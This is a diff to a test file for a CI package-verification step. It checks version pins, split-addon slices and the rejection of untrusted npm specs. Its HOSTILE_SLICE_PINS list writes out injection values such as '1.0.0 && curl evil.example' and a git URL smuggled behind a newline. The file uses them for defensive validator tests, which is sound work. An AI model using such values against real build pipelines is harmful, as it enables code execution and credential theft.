@@ -521,11 +521,9 @@ test('provenance mismatch fails instead of testing the wrong binary', () => {
   assert.match(run.output, /but package-version pins/)
 })
 
-// A package with no prebuilds/ and nothing to fall through to must still fail
-// closed. WHICH message it gets matters: a GPR dev build is never sliced, so
-// telling its author to look for a @tetherto/<addon>-mono-android-arm64 package
-// would send them after something that cannot exist, when the real problem is
-// that the on-merge run published the dev build without its prebuild artifacts.
+// A GPR dev build is never sliced, so naming a @tetherto/<addon>-mono-<platform>
+// package would send its author after something that cannot exist. The real
+// fault is an on-merge run that published without its prebuild artifacts.
 test('a @tetherto dev build without prebuilds/ is called out as an unsliced publish', () => {
   const run = runStep({
     packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
@@ -535,7 +533,7 @@ test('a @tetherto dev build without prebuilds/ is called out as an unsliced publ
 
   assert.notEqual(run.status, 0)
   assert.match(run.output, /@tetherto\/llm-llamacpp-mono@0\.47\.0-tmp\.runid-1 ships no prebuilds/)
-  assert.match(run.output, /publishes the UNSLICED tree/)
+  assert.match(run.output, /GPR dev builds are published unsliced/)
   assert.doesNotMatch(
     run.output,
     /-mono-android-arm64/,
@@ -546,8 +544,7 @@ test('a @tetherto dev build without prebuilds/ is called out as an unsliced publ
 })
 
 // The @qvac equivalent: neither layout, so there genuinely is nothing to test.
-// Here naming the platform package IS right — it tells the reader which slice
-// the publish should have produced.
+// Here naming the platform package IS right — it says which slice was missing.
 test('a @qvac package with neither prebuilds/ nor slices is rejected', () => {
   const run = runStep({
     addonName: '@qvac/llm-llamacpp',
@@ -566,15 +563,11 @@ test('a @qvac package with neither prebuilds/ nor slices is rejected', () => {
   assert.equal(run.androidPrebuildInstalled, false)
 })
 
-// ---------------------------------------------------------------------------
-// Split addons (QVAC-24574 / QVAC-25055).
-//
-// asr, tts and audiogen publish a JS-only @qvac meta package plus per-platform
-// packages. The step used to hard-fail on "No prebuilds directory found in
-// package" the moment it unpacked such a tarball, so EVERY standalone mobile
-// dispatch for those addons died before the build and before any device time.
-// These tests pin the fall-through to the per-platform package.
-// ---------------------------------------------------------------------------
+// Split addons (QVAC-24574 / QVAC-25055). asr, tts and audiogen publish a
+// JS-only @qvac meta package plus per-platform ones. The step used to hard-fail
+// on "No prebuilds directory found in package" the moment it unpacked such a
+// tarball, killing every standalone mobile dispatch for those addons before the
+// build and before any device time.
 
 const SPLIT = { MOCK_NPM_SPLIT: '1', MOCK_NPM_VERSION: '0.5.0' }
 
@@ -638,11 +631,9 @@ test('a split addon with an empty package-version reaches the device', () => {
 })
 
 // buildOptionalDependencies() copies metaManifest.version into every entry, so
-// the slice pin and the meta version are equal for anything the slicer produced.
-// A manifest where they differ is wrong or tampered with, and following it would
-// install a build the caller never pinned AFTER the step has already printed
-// "Verified: ... (pinned)" for the meta — the QVAC-21879 shape, where a
-// benchmark baseline measured a binary nobody asked for.
+// these are equal for anything the slicer produced. Following a difference would
+// install a build the caller never pinned, after the step already printed
+// "Verified: ... (pinned)" for the meta — the QVAC-21879 shape.
 test('a slice pinned away from the meta version is refused', () => {
   const run = runStep({
     addonName: '@qvac/asr-ggml',
@@ -712,9 +703,8 @@ test('a slice carrying no binaries is rejected rather than silently empty', () =
   assert.match(run.output, /contains no addon\/prebuilds/)
 })
 
-// A split addon still has to honour the pin and the addon-identity checks: those
-// run on the meta manifest, BEFORE the slice is resolved, so a rejected meta
-// must never reach the registry a second time.
+// The pin and addon-identity checks run on the meta manifest BEFORE the slice is
+// resolved, so a rejected meta must never reach the registry a second time.
 test("a split addon still rejects another addon's package before fetching a slice", () => {
   const run = runStep({
     addonName: '@qvac/asr-ggml',
@@ -744,9 +734,8 @@ test('a split addon still rejects a pin the registry did not honour', () => {
   assert.match(run.output, /but package-version pins 0\.5\.0/)
 })
 
-// The @tetherto dev build is published UNSLICED (publish-library-to-gpr ships
-// the whole tree, no slice step), so the split path must not engage for it —
-// otherwise "test my unmerged native change" would start chasing @qvac slices
+// @tetherto dev builds are published unsliced, so the split path must not engage
+// for them — otherwise "test my unmerged native change" would chase @qvac slices
 // that were never published to GitHub Packages.
 test('a @tetherto dev build of a split addon still uses its inline prebuilds', () => {
   const run = runStep({
@@ -765,13 +754,11 @@ test('a @tetherto dev build of a split addon still uses its inline prebuilds', (
   )
 })
 
-// The version half of the slice spec is REGISTRY-CONTROLLED — it is read out of
-// the downloaded tarball's manifest, not supplied by the caller. `name@<spec>`
-// is an npm alias, so whatever follows the '@' decides the spec type regardless
-// of the name: a value like "evil/repo" resolves as a GitHub shorthand and
-// `npm pack` would clone it and RUN its prepare script, in a step holding a GPR
-// credential. The caller-supplied spec is already regex-gated for exactly this
-// reason; the slice spec must be too.
+// The slice spec's version half is REGISTRY-CONTROLLED. `name@<spec>` is an npm
+// alias, so whatever follows the '@' decides the spec type: "evil/repo" resolves
+// as a GitHub shorthand and `npm pack` would clone it and RUN its prepare script,
+// in a step holding a GPR credential. The caller's spec is already regex-gated
+// for this reason; the slice spec must be too.
 const HOSTILE_SLICE_PINS = [
   'evil/repo',
   'git+https://github.com/evil/x.git',
@@ -783,9 +770,8 @@ const HOSTILE_SLICE_PINS = [
   'latest',
   '^1.2.0',
   '1.0.0 && curl evil.example',
-  // grep matches per LINE, so a value whose FIRST line is a valid version would
-  // satisfy a line-oriented shape check while smuggling a git spec behind the
-  // newline. The charset gate runs over the whole string and catches it.
+  // A line-oriented check would pass this on its first line alone; bash =~
+  // matches the whole string, so the newline cannot hide the payload.
   '0.0.1\ngit+https://evil.example/x.git',
 ]
 
@@ -831,10 +817,8 @@ test('a legitimate prerelease version is still accepted', () => {
 })
 
 test('both npm pack invocations disable lifecycle scripts', () => {
-  // Defence in depth behind the two spec validations: packing a registry
-  // tarball never needs a lifecycle script, so --ignore-scripts is a no-op on
-  // every legitimate path and neuters `prepare` if a non-registry spec ever
-  // slips past.
+  // Defence in depth behind the spec validations: a no-op when packing a
+  // registry tarball, and neuters `prepare` if a non-registry spec slips past.
   const run = runStep({
     addonName: '@qvac/asr-ggml',
     packageVersion: '@qvac/asr-ggml@0.5.0',
